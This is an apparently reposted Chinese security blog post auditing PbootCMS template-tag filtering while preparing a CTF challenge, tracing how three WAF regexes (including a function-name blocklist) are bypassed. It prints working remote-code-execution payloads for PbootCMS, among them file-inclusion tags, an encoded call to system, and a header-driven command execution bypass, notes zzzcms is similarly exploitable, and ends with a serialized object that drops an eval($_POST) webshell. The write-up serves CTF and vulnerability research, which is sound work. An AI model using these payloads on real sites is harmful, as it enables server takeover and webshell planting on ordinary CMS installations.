> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/8663)

前言
--

机缘巧合，为了给 bytectf 出题，不会写代码，无奈拿起老本行，代码审计一下 pbootcms，先说一次，CTF 诚不欺我

0x01
----

目前公网看到的最新的是 3.0.1 版本的 rce，[https://xz.aliyun.com/t/8321](https://xz.aliyun.com/t/8321)，简单审计之后发现这个 cms 的历史漏洞真多，比如比较新的有这个 [https://www.anquanke.com/post/id/222849#h3-6](https://www.anquanke.com/post/id/222849#h3-6)，不过这里与之前漏洞不太一样的是，这是修改文件上传后缀 getshell，前提还需要能破解 admin 的密码

0x02
----

那么我们再来看这里的 rce 都是怎么防御的，总的来说，要过三个正则

```
\{pboot:if\(([^}^\$]+)\)\}([\s\S]*?)\{\/pboot:if\}

([\w]+)([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?\(

(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(array_filter)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)|(session_id)
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101427-17b2abe4-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101427-17b2abe4-3db2-1.png)  
可以说是非常的苛刻，最终调用的 php 代码如下

```
eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
```

我们首先来看第一个正则

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101503-2d2d60e0-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101503-2d2d60e0-3db2-1.png)  
这个正则主要是限制了，if 语句里面不能出现}、^、$ 这三个字符

我们来看看第二个正则

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101513-333e5bba-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101513-333e5bba-3db2-1.png)  
很明显，这里限制了调用了函数，在 KCon2019 大会上的提出的新特性也过滤掉了，导致调用函数基本不成可能？？  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101531-3de18948-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101531-3de18948-3db2-1.png)  
来看第三个正则，是一个完全的黑名单，黑名单的产生是一个一个漏洞堆出来了，这里提一个醒，过滤了 include，没有过滤 require 的操作实在太秀，笔者测试发现在 3.0.2 之前是可以配合文件上传 rce 的，默认 cms 前台是个人中心是有一个头像上传的地方，所以你懂的，注意，也是前台 getshell 哦，payload 如下

```
{pboot:if(1)require "/var/www/html/static/upload/image/xxxxxxx/1531651052463520.png";//)}sdfsd{/pboot:if}
```

完美符合预期

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101626-5ea2e0aa-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101626-5ea2e0aa-3db2-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101629-6096fa72-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101629-6096fa72-3db2-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101640-66a1e17a-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101640-66a1e17a-3db2-1.png)  
这里再提一句，如果前端没有文件上传功能，这里还可以 getshell，这里再给一个 payload，我们可以包含日志文件，当然上面也是可以包含日志文件的，此 trick 来源于 N1CTF_easytp5 那道题

```
{pboot{user:password}:if(1)require+\app\home\controller\ParserController::parserMemberLabel('/Applications/MAMP/htdocs/1.php');//)}sdfsd{/pboot:if}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101715-7bf3be04-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101715-7bf3be04-3db2-1.png)

0x03
----

上面所说的为什么不能再最新版本使用呢，是因为 3.0.4 移除了一个 decode_string 函数  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101727-83233056-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101727-83233056-3db2-1.png)

而老版本正好有一个双引号在带入之前是经过了 html 解码的，在 3.0.4 版本不行 (在 3.0.3 就去除了)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101730-84d3127c-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101730-84d3127c-3db2-1.png)

所以 3.0.3 跟 3.0.4 版本变得不可行

0x04
----

经过了一连串历史漏洞的分析我们发现要想造成 rce，最需要绕过的是第二、三个正则

```
([\w]+)([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?\(
```

大家对无字母 getshell 非常的熟悉，[https://xz.aliyun.com/t/8107](https://xz.aliyun.com/t/8107) 这篇文章写的非常的详细，我们参考文章尝试一下抑或可行？

在 PHP7 中，我们可以使用 ($a)() 这种方法来执行命令。

```
(~urldecode("%8c%86%8c%8b%9a%92"))(~urldecode("%88%97%90%9e%92%96"));
```

这里翻译过来执行的是 system('whoami');

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101844-b0a60c60-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101844-b0a60c60-3db2-1.png)  
仿佛好像有了？？？我们打远程看看

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101927-ca4bebd0-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101927-ca4bebd0-3db2-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101849-b3acad38-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101849-b3acad38-3db2-1.png)  
可以看到，经过了 htmlspecialchars 函数处理之后，由于存在不可见字符，直接替换为空了，这条路绝了??

0x05
----

下面就是这篇文章的精彩内容，CTF 诚不欺我。

目前有一个思路，我们假设不存在这个 htmlspecialchars 函数，那么我们后面应该是可以 rce 的，而且细心发现，这里怎么变成了 pboot@if？？

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101944-d45fcc86-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101944-d45fcc86-3db2-1.png)  
是因为在调用 escape_string 之前，他把我们替换掉了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101945-d5468586-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101945-d5468586-3db2-1.png)  
但是呢，我们往后看

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101953-da12c6d8-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101953-da12c6d8-3db2-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214101957-dc427dd6-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214101957-dc427dd6-3db2-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102000-de3869f2-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102000-de3869f2-3db2-1.png)  
太秀了，后面他会识别正则，然后替换为空，作为老赛棍来说，有内双写替换为空那味了，简单入门操作, 就这样，我们成功的走到了最后一步

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102056-ff64d610-3db2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102056-ff64d610-3db2-1.png)  
成功 rce，我们在细心一点，这里我们竟然把所有正则都给过去了？？  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102117-0c29998a-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102117-0c29998a-3db3-1.png)

你好是的，第二个正则在这里就跟没有一样，你看，是不是直接随便绕

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102124-1073103e-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102124-1073103e-3db3-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102135-168c8720-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102135-168c8720-3db3-1.png)

0x06
----

万事具备，只差东风，就差一个 htmlspecialchars 了，前面尝试的是抑或，然后编码的形式绕过死亡黑名单，但是差一点，这里不得不提到，不知道大家还记得国赛的 Lovemath 那道题没有

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102157-241a5db8-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102157-241a5db8-3db3-1.png)  
这里没有乱码，没有双引号，夜晚的星星还是那么亮，一切都是这么的朴实无华

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102201-267b4356-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102201-267b4356-3db3-1.png)

0x07
----

有趣的是祥云杯线上出来了这个 cms，直接完美撞车

~前排提醒，zzzcms 目前最新版本 1.8.4 也可以这么操作，这里我 waf 看起来恶心，结果 ` 都没过滤，老开发了. jpg~

```
$danger=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','print','echo','var_dump');
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102239-3d27a392-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102239-3d27a392-3db3-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102245-409bc9e0-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102245-409bc9e0-3db3-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102249-42ffb0b6-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102249-42ffb0b6-3db3-1.png)

0x08
----

万万我没有想到的跟祥云杯竟然撞车了，而与出题人一番沟通之后，发现 payload 跟我一样，那再这样出题，肯定是不行的，不过 php 是世界上最好的语言对吧，我们有没有办法绕过第三个正则呢

```
(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(array_filter)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)|(session_id)
```

你好有的，更直接的方法，能让这些黑名单全部失效掉, 再次之前，第一个、第二个正则已经全部失效掉了，现在三个正则都全绕过了 2333，如下姿势

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102317-539cd28c-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102317-539cd28c-3db3-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102323-5727135e-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102323-5727135e-3db3-1.png)

```
{pboot{user:password}:if(1)(sys.tem)(((ne.xt)((getallheade.rs)())));;//)}sdfsd{/pboot:if}
```

End
---

pbootcms 可所谓漏洞百出，修复方法，看官方吧 (php 是世界上最好的语言，不过 php8 的存在可能导致 ctfer 失业)

补充
--

签到题预期解法如下，出现严重失误导致全部非预期，实属惭愧

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201214102438-83ecbdb2-3db3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201214102438-83ecbdb2-3db3-1.png)

```
O:1:"B":3:{s:7:"content";s:31:"<?php echo 1;eval($_POST[a]);?>";s:8:"filename";s:5:"1.php";s:6:"decade";O:3:"pdo":0:{};}
```

原理就是这个 fatal error，然后导致后面代码停止执行，但是反序列化的 destruct 方法还是会执行